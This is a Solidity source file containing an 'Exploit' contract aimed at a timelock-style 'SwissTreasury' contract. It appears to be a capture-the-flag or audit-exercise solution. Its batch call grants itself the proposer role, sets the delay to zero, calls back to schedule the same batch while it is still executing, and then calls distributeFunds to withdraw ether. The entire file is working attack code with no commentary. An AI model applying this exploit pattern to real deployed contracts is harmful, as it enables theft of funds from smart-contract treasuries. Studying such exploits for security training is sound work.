pragma solidity 0.8.11;

interface ISwissTreasury {
    function executeBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt
    ) external payable;
    function scheduleBatch(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata datas,
        bytes32 predecessor,
        bytes32 salt,
        uint256 delay
    ) external;
}

contract Exploit {
    ISwissTreasury swiss_treasury;
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    constructor(ISwissTreasury _swiss_treasury) {
        swiss_treasury = _swiss_treasury;
    }

    function attack1() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = prepare_payload_1();
        swiss_treasury.executeBatch(targets, values, datas, bytes32(0), bytes32(0));
    }

    function attack2() public {
        (address[] memory targets, uint256[] memory values, bytes[] memory datas) = prepare_payload_1();
        swiss_treasury.scheduleBatch(targets, values, datas, bytes32(0), bytes32(0), 0);
    }

    function prepare_payload_1() public returns (address[] memory, uint256[] memory, bytes[] memory) {
        // First batch
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory datas = new bytes[](4);
        targets[0] = address(swiss_treasury);
        targets[1] = address(swiss_treasury);
        targets[2] = address(this);
        targets[3] = address(swiss_treasury);
        values[0] = 0;
        values[1] = 0;
        values[2] = 0;
        values[3] = 0;
        datas[0] = abi.encodeWithSignature("grantRole(bytes32,address)", PROPOSER_ROLE, address(this));
        datas[1] = abi.encodeWithSignature("updateDelay(uint256)", 0);
        datas[2] = abi.encodeWithSignature("attack2()");
        datas[3] = abi.encodeWithSignature("distributeFunds(address,uint256)", address(0), 1 ether);

        return (targets, values, datas);
    }
}